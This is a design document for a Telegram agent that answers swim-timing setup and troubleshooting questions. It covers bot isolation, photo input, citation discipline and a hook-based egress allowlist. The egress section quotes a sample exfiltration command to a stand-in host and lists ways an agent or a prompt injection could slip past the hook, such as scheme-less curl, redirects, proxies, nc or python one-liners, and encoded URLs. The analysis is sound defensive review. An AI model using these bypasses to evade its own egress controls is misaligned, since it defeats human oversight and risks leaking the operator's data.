# CTSAgent: Design

> Design doc for a NanoClaw agent that answers any CTS swim-timing setup / config / troubleshooting question over Telegram, grounded in the `cts-knowledge/` files. This doc is about BUILDING the agent. It is deliberately kept OUT of `cts-knowledge/` so it never pollutes the agent's grounding context. Status: design, not yet implemented (2026-06-16).

## Goal and scope

One single-lane agent. Its entire job: **swim-meet timing setup, ideal configuration, and troubleshooting** for the CTS Gen7 + Hy-Tek Meet Manager + DisplayLink Plus stack. It answers "how do I set X", "what's the ideal config", and "why is the scoreboard blank / not showing names / not showing the timer", and it walks the operator through a fix.

Lane purity (the agentSQ discipline): this agent does timing ops only. It does not drift into meet-management strategy, swimmer performance, or anything off-stack. Out of scope goes to "I don't cover that."

## Locked decisions (2026-06-16)

1. **Tenancy: owner-only now, multi-user soon.** Ship reachable by Ankush first. Requirement clarified 2026-06-17: other timing volunteers must be able to reach CTSAgent but NOT Nano or Mira (audience isolation); a shared group chat for CTSAgent is acceptable if per-user DMs are not.

   **Channel decision (research-backed 2026-06-17): Option B — a dedicated SECOND Telegram bot wired only to CTSAgent.** Rationale: the requirement is a security boundary *between different people*, which the project's own `docs/isolation-model.md` says calls for separate agents/surfaces. Option A (shared bot + CTS group) isolates only at the app layer over a SHARED bot identity, and has a standing identity-bleed path: any volunteer who sees the shared bot's `@username` can DM it (`src/channels/telegram-pairing.ts` even documents "anyone who guesses the username can DM it"). By default that DM is an unwired messaging group that escalates to the owner or drops (so it does not auto-leak to Nano/Mira), but it is one config slip (a `public`/role grant) from leaking and is noisy. Option B is true Telegram-native isolation: separate identity, token, `@username`; volunteers never learn the Nano/Mira bot's handle; app gates remain as defense in depth.

   **Bounded adapter change Option B needs:** the platform already has the multi-instance plumbing (`instance` dimension, `UNIQUE(channel_type, platform_id, instance)`, migration 016, `chat-sdk-bridge` instance support). `src/channels/telegram.ts` currently reads one `TELEGRAM_BOT_TOKEN` and registers under key `'telegram'` with no instance. The change: register a SECOND bridge with a distinct token env (e.g. `TELEGRAM_BOT_TOKEN_CTS`), a distinct registry key, and `instance: 'telegram-cts'`. One poller per token (two pollers on one token → 409).

   **Caveat (do not rely on user-namespace separation):** a volunteer is still `telegram:<handle>` to BOTH bots (`channelType` stays `telegram`). Isolation comes from the volunteer never having the other bot's handle PLUS the app gates, NOT from a separate user id. So never grant a volunteer a role/membership on Nano or Mira.

   **Access-control mapping:** wire the CTS bot/group to CTSAgent only; set that messaging group `unknown_sender_policy='public'` for frictionless volunteer access in a controlled group (or keep `strict` + add `agent_group_members`). Option C (forum-topic routing) is rejected: the adapter sets `supportsThreads:false` and would not isolate audiences anyway.

   **Interim fallback:** if shipping today with zero code matters more than full isolation, Option A with the CTS group set `public` and nothing else changed is acceptable (default `strict` protects Nano/Mira), but plan to move to B.
2. **Photo input: must-have.** Sending a photo of the blank board / error screen is a headline feature. This GATES launch on verifying Telegram inbound-image staging works (see Photo Input).
3. **Egress: allowlist (CTS + Hy-Tek docs) plus vetted community/forum sources.** Not fully offline. The agent may read a small, explicitly allowed set of authoritative and community sources. Everything it returns is grounded by citation; anything uncited is displayed separately and labeled as uncited model knowledge.

## Architecture: clone of the agentSQ blueprint

CTSAgent is a group folder plus two policy files. Mapping the proven local pattern:

| agentSQ component | CTSAgent equivalent |
|---|---|
| `groups/agentsq/` workspace | `groups/cts/` |
| `CLAUDE.local.md` (the only hand-edited file) | CTS personality + grounding discipline (cite/defer rules) |
| `duediligence/` recipes | `groups/cts/knowledge/` = the `cts-knowledge/` files (00-09, 99) |
| `properties/<apn>/` deliverables | `groups/cts/knowledge/episodic/<meet>.md` write-back logs |
| `container.json` | provider `claude`, model Opus (or Sonnet), no packages, no custom MCP servers |
| `runner-policy.json` | egress allowlist + loop guards |
| `deliver_dossier` custom tool | NONE. CTS answers in chat; no atomic file delivery pipeline |
| `create_agent` via Nano | sanctioned creation path (NOT `ncl groups create`) |

**Why this is much simpler than agentSQ:** agentSQ's complexity was safely fetching and delivering gov-portal PDFs (recipes, render caps, DPI guards, the deliver_dossier tool, thrash-breakers). CTSAgent reads a local bounded KB and talks. None of that pipeline is needed. It is a small, calm agent.

### Files to author (the only hand-written surface)

- `groups/cts/CLAUDE.local.md` — personality, role, scope, and the operating rules below.
- `groups/cts/knowledge/*.md` — copy of the `cts-knowledge/` set (the grounding context).
- `groups/cts/runner-policy.json` — egress allowlist + guards.
- `container.json` — via `ncl groups config` / create_agent, not hand-edited.

## Knowledge delivery and grounding discipline

**Full-context, not RAG.** The KB is ~760 lines, fits in context whole. Load all files every session. No vector store. Add retrieval only if episodic logs eventually outgrow the context budget (likely never for one pool).

**Layered the way the agent treats it:** semantic (00-05), instance/config (07), procedural (09), grounding rules (08), sources (99).

**Operating rules baked into CLAUDE.local.md (from `cts-knowledge/08`):**
- **Cite.** Every factual claim names its source file (and section where useful). Format: claim `[07-observed-live-config.md]`.
- **Separate uncited from cited.** Anything the agent says that is NOT backed by the KB is rendered in a clearly marked "Uncited / general knowledge" section, never blended into the cited answer. (This is exactly Ankush's requirement.)
- **Defer.** On an `UNVERIFIED` tag or a genuine gap, say so and ask the operator rather than invent a port, version, or menu path.
- **Confidence-aware.** Honor the `[HIGH]` / vendor-conflict / `UNVERIFIED` tags already in the files; surface the cabling vendor-conflict honestly when relevant.

## Troubleshooting design

Troubleshooting is an **interactive diagnostic dialogue**, not a rigid script, because it branches on the operator's answers. It is agent-reasoned over the grounded tables in `cts-knowledge/05` and `09`, with the guard that it may only diagnose from grounded content (or clearly-labeled uncited general knowledge).

Pattern per symptom:
1. **Disambiguate the symptom.** "Blank" vs "names missing" vs "timer not running" are different rows in file 05. First question narrows it.
2. **Branch on the layered model** (file 05's 5-layer model: power/cable, right interface, right address, right software state, right selection).
3. **Ask for the photo** when a visual symptom is in play (board state, error dialog, a settings screen).
4. **Cite the fix** to the KB row. If the path runs into an `UNVERIFIED` area, defer to the operator and, once answered, write it back.

The top symptoms to support on day one (all already in file 05): scoreboard blank, names not appearing, event/timer not showing, no times reaching Meet Manager, timer not auto-discovered, "Event Sequence not received".

## Photo input (the must-have, and its gate)

**Mechanism (confirmed in the platform code):** the host `extractAttachmentFiles` (`src/session-manager.ts`) decodes an inbound attachment's base64 `data` to a file at `/workspace/sessions/<id>/inbox/<msgId>/<file>`, which the agent reads with multimodal vision. Fully supported END TO END, on one condition: the channel adapter must emit the image as base64 `data`. The staging code skips any attachment whose `data` is not a string.

**The gate:**
- WhatsApp adapter: confirmed broken (emits `localPath`, no `data`). Images never stage.
- Telegram adapter: UNKNOWN. This must be verified before launch.

**Pre-launch task:** send a photo to the Telegram bot and confirm it lands in the session inbox and the agent can `Read` it. If the Telegram adapter does not emit base64 `data`, fix it on the channels branch (one-adapter change) before this agent is useful. This is the single highest-risk implementation item.

## Egress allowlist

**DECISION 2026-06-16: hook-only, do NOT block traffic at the network perimeter.** Enforce the allowlist in the `runner-policy.json` PreToolUse hook (the intent layer).

**IMPLEMENTED 2026-06-16:** added `allowedDomains` to the runner policy and the PreToolUse hook (`container/agent-runner/src/policy.ts` `findDisallowedUrl` + interface/loader; `providers/claude.ts` hook check + wiring; `providers/types.ts`; `index.ts`; tests in `policy.test.ts`). When `allowedDomains` is non-empty, any http(s) URL in a `WebFetch` url or a Bash command whose host is not an allowed domain (exact or subdomain) is hard-blocked with a steer to answer-from-KB-or-defer. Host match is suffix-safe (look-alike hosts like `coloradotime.com.evil.com` are rejected; verified by unit assertions). Deny-list takes precedence over allow-list. Logic verified via Node (bun test + container typecheck must run in the container/CI: no bun on the host).

**Reviewed (security + code review, 2026-06-16): sound for lane-keeping; verdict ship-after-one-fix.** Ordering, deny-over-allow precedence, and suffix-safe host matching all confirmed correct; every crafted host (IP-literal, IPv6, userinfo, trailing-dot) errs to over-block, never leaks. Three findings applied:
- FIXED (must-fix): bare-TLD config entry (e.g. `"com"`) silently allowed all `*.com`. Loader now rejects single-label / wildcard / `@` / leading-dot entries.
- FIXED (correctness, fail-safe): userinfo `user:tok@host` now strips to the TRUE host before matching, so `allowed.com@evil.com` correctly evaluates and blocks `evil.com`, and `user@allowed.com` is no longer falsely blocked.
- FIXED (correctness, fail-safe): trailing-dot FQDN `coloradotime.com.` on an allowed host now matches.

**Remaining limitations (ACCEPTED under the hook-only decision; the network perimeter is the real fix if they ever matter):**
- A scheme-less Bash fetch (`curl coloradotime.com` with no `https://`), proxy/redirect (`curl -L` that 302s away, `-x` with a scheme-less proxy), alternate tools (wget/nc/python one-liners), and encoded/env-built URLs all bypass an intent-layer hook. Realistic only for a non-cooperative agent; CTSAgent is cooperative and single-purpose. Add `blockedDomains` for specific known-bad as defense-in-depth.
- `WebSearch` is not gated (returns results, does not fetch page content; the follow-up `WebFetch` IS gated). Search-to-find, fetch-only-allowed.
- Injection scope: the hook controls egress DESTINATION, not content trust. It narrows the naive `curl https://evil.com/?leak=` exfil path but is not a containment boundary against a motivated injection (which could use the bypass vectors above). The cite-and-separate-uncited discipline plus the narrow allowlist are the real mitigations.

**Tradeoff, acknowledged:** the hook is evadable in principle (it steers a cooperative agent at the tool-call layer, it is not a kernel/network boundary). That is acceptable here because CTSAgent is a single-purpose, cooperative agent reading vendor and community docs, not adversarial code. This is **lane-keeping, not a hard security perimeter.** If the threat model changes (untrusted input that could try to exfiltrate, multi-tenant with untrusted users), revisit and add the un-evadable network-perimeter allowlist underneath. Captured in the pretool-vs-egress framing: hook now, perimeter later if warranted.

**Allowlist v1 (authoritative):**
- `coloradotime.com` (CTS manuals, support, F1034/F1066/etc.)
- `hytek.active.com`, `support.activenetwork.com` (Hy-Tek/Active KB)

**Allowlist v2 (vetted 2026-06-16, all actually fetched headless, no login):**
- `hytek.active.com` (`/user_guides_html/`) — Meet Manager guide HTML (primary).
- `activenetwork.my.salesforce-sites.com/hytekswimming` — official Hy-Tek/Active KB, the exact MM-to-Gen7 COM-port procedure (primary).
- `marcoscorner.walther-family.org` — the one alive, open community source; reverse-engineered CTS protocol: baud 9600 8-O-1 console-side / 8-E-1 scoreboard-side, RS-232/RS-485, module hex addressing (lanes 1-10 = 0x01-0x0A). Cite at COMMUNITY confidence; note it is largely System-6-era and the Gen7 uses an encrypted scoreboard interface, so do not assert its baud values as Gen7 fact (community).
- `manualslib.com` — optional HTML fallback for the full Gen7 manual if PDF parsing is unavailable (secondary).

**High-value source found:** `coloradotime.com/support/system-6-troubleshooting-guide` reads almost line-for-line like a timing chair's bad night (blank scoreboard -> DIP/blank/power/address check; touchpad not registering -> arm-indicator + cabling). Worth mining into `cts-knowledge/05` as additional grounded troubleshooting rows.

**Rejected (do NOT allowlist, all confirmed dead to a headless agent):** help.swimtopia.com and support.swimcloud.com (HTTP 403 Zendesk/JS wall), pvswim.org / gomotionapp.com LSC PDFs (404/403, rotted or bot-blocked), USMS forums + reddit (login/JS walls), Facebook groups (login-walled). On-topic for a human, useless to the agent.

**Note for the marcoscorner baud finding:** this partially answers the open "serial baud/data-format" question (file 06 #5) but only at community confidence and likely System-6-specific. Confirm against F1034 before treating as Gen7 fact.

Web tools (`WebFetch`/`WebSearch`) are granted but constrained to the allowlist hook. Default answer path is still the local KB; the web is for self-update and for community-sourced troubleshooting the manuals do not cover.

## Write-back / episodic loop (no new code)

The tribal-knowledge capture from `cts-knowledge/08`, implemented with stock tools:
```
gap detected -> defer over Telegram -> operator answers -> agent Write/Edit appends to
groups/cts/knowledge/episodic/<meet>.md  (with date + "source: Ankush") -> next session it loads and cites it
```
No custom MCP tool. The agent writes to its own workspace. Over meets, defers shrink as the episodic log fills. That is the "pre-meet anxiety goes away" mechanism.

## Multi-user seam (architected now, wired later)

To make the later jump from owner-only to crew-wide a wiring change:
- Keep all knowledge in the shared group workspace (not in per-user memory), so every future user inherits it.
- When adding people: add them as `members`, wire a Telegram group messaging-group (or per-user DMs), and pick session mode (recommend `agent-shared` so the timing brain and episodic log are common).
- Approver for defer/HITL stays Ankush (owner) until volunteers are trusted.

## Build-time verification fleet (dev-loop quality agents)

These agents assist US while building CTSAgent. They are NOT part of the shipped agent. Each verifies a runtime guardrail or the code that implements it.

### Best practices (how to write/run them)

1. **One lens per agent.** Each agent owns a single dimension (correctness, security, perf, tokens, provenance, tests). A "review everything" agent dilutes. Separate boxes, separate prompts.
2. **Generator-critic separation.** The agent that writes code does not approve it. Critics run on the diff with fresh, skeptical context. For high-stakes findings, adversarial majority vote (N independent skeptics prompted to refute; kill the finding unless >= 2/3 confirm).
3. **Deterministic gate vs adaptive agent (the agentSQ lesson).** Tests, typecheck, lint, token-count are deterministic -> make them HARD GATES (pass/fail), not agent judgment. Reserve agents for adaptive judgments ("is this a real security bug?", "is this design sound?"). Do not ask an LLM to do what a typechecker does.
4. **Ground the verifiers too.** A security finding cites file:line + the rule; a perf finding cites a measurement, not a vibe. No hallucinated bugs. Same provenance discipline we demand of the product agent.
5. **Run continuously, pipeline not big-bang.** Review each artifact as it lands (CLAUDE.local.md, runner-policy.json, the adapter fix), while context is fresh and the fix is cheap. Not one giant review at the end.
6. **Bounded context + structured outputs.** Each agent sees the diff + relevant files only, never the whole repo. Return compact schema verdicts (findings with file:line/severity/fix/confidence), not prose dumps. This is the token discipline.
7. **Worktree isolation for parallel mutators.** Read-only critics run anywhere; any agent that edits files in parallel runs in its own git worktree to avoid clobbering.
8. **Faithful reporting.** No false greens. Tests fail -> say so with output. A skipped check is reported as skipped. Verify a finding is real before surfacing it.
9. **HITL gate for the consequential.** Security findings and irreversible changes pause for human approval.

### The fleet, mapped

| Agent | Lens | Gate or adaptive | Grounds against / checks |
|---|---|---|---|
| **Code review** | correctness, reuse, simplification | adaptive | the diff; `/code-review` skill |
| **Security** | egress-hook correctness, inbound-image path-traversal, secrets, **prompt-injection surface** (we grant web tools, so allowlisted pages are an injection vector) | adaptive + some hard checks | the diff + `/security-review`; the hook + adapter code |
| **Performance** | per-turn cost, turn count, context size, the agentSQ exit-condition guards (stateless-reap, loop-breakers) | measurement gate + adaptive | run logs; profile-don't-guess |
| **Token optimizer** | KB-load cost, prompt size, structured-output compactness | measurement gate + advisory | token counts per turn |
| **Provenance check** | does the SHIPPED agent actually cite, separate uncited, and defer on UNVERIFIED? | integration eval (gate) | live agent outputs, not source code |
| **Testing** | the 4 day-one flows + regressions | deterministic gate | integration tests |

Note: **provenance is a runtime behavior eval, not a code review.** It asserts the agent's outputs carry citations and segregate uncited content. It belongs in the integration-test suite, run against the live agent.

### Orchestration vehicle

- Ad-hoc during coding: Claude Code subagents (`Agent` tool) + the `/code-review` and `/security-review` skills.
- Structured fan-out (find -> adversarially verify -> synthesize across all lenses at a checkpoint): a Workflow. Billable/scale, so run only on explicit opt-in.
- Pattern: pipeline each artifact through its relevant lenses as it lands; barrier only when a stage needs all findings at once (e.g. dedup before fixing).

## Build plan (phases, for implementation later)

1. **Verify the photo path.** Confirm Telegram inbound images stage and the agent can Read them. Fix the adapter if not. (Gate.)
2. **Create the agent** via the sanctioned `create_agent` path; folder `groups/cts/`.
3. **Author `CLAUDE.local.md`** with role, scope, and the cite/separate-uncited/defer rules.
4. **Mount the KB** (copy `cts-knowledge/` into `groups/cts/knowledge/`).
5. **Set `runner-policy.json`** with the egress allowlist (v1 now, v2 after vetting) and sane loop guards.
6. **Wire Telegram DM** to the agent (sanctioned register path, so the destination row is created and replies route correctly).
7. **Smoke test** the four day-one flows: a setup question, an ideal-config question, a blank-board photo troubleshoot, and a deliberate defer that writes back.
8. **Finish the KB** (tomorrow's remaining captures: exact DL+ version, serial-vs-UDP names path).

## Open risks / tasks

- **Telegram inbound image staging** (gate, item 1 above).
- **Forum allowlist vetting** (research in flight).
- Remaining KB unknowns: exact post-update DL+ version; whether names ride serial COM3 or UDP; lane/start-system pinouts.
- Allowlist enforcement posture: confirm whether to invert the hook to an allow-list or rely on the network perimeter for the allow-list semantics.
